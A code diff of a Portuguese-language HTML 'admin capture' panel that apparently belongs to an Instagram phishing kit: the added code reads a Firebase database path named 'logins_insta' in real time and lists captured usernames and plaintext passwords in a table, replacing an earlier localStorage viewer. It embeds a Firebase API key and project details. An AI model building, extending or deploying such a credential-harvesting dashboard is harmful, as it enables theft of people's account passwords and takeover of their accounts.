@@ -2,27 +2,48 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Painel Secreto</title>
+    <title>Painel Admin - Captura</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; padding: 50px; }
-        .painel { border: 1px solid #333; padding: 20px; background: #000; max-width: 400px; }
-        b { color: #ff00ff; }
+        body { font-family: sans-serif; background: #121212; color: #00ff00; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; background: #1e1e1e; }
+        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
+        th { color: #0095f6; }
     </style>
 </head>
 <body>
+    <h2>Logins Capturados</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Data</th>
+                <th>Usuário</th>
+                <th>Senha</th>
+            </tr>
+        </thead>
+        <tbody id="lista"></tbody>
+    </table>
 
-<div class="painel">
-    <h2>🕵️ DADOS RECUPERADOS</h2>
-    <p>Último Usuário: <b id="resUser">Nenhum</b></p>
-    <p>Última Senha: <b id="resPass">Nenhuma</b></p>
-    <button onclick="localStorage.clear(); location.reload();">Limpar Registro</button>
-</div>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBKDt453P9yD56Td_-oURBWaOTdaukhuUo",
+            authDomain: "instagram-3e2e5.firebaseapp.com",
+            databaseURL: "https://instagram-3e2e5-default-rtdb.firebaseio.com",
+            projectId: "instagram-3e2e5"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-<script>
-    // Recupera o que está escondido no LocalStorage
-    document.getElementById('resUser').innerText = localStorage.getItem('user_capturado') || "Vazio";
-    document.getElementById('resPass').innerText = localStorage.getItem('pass_capturado') || "Vazio";
-</script>
-
+        // Escuta o banco em tempo real
+        database.ref('logins_insta').on('value', (snapshot) => {
+            const lista = document.getElementById('lista');
+            lista.innerHTML = "";
+            snapshot.forEach((item) => {
+                const d = item.val();
+                lista.innerHTML += `<tr><td>${d.data}</td><td>${d.usuario}</td><td>${d.senha}</td></tr>`;
+            });
+        });
+    </script>
 </body>
 </html>
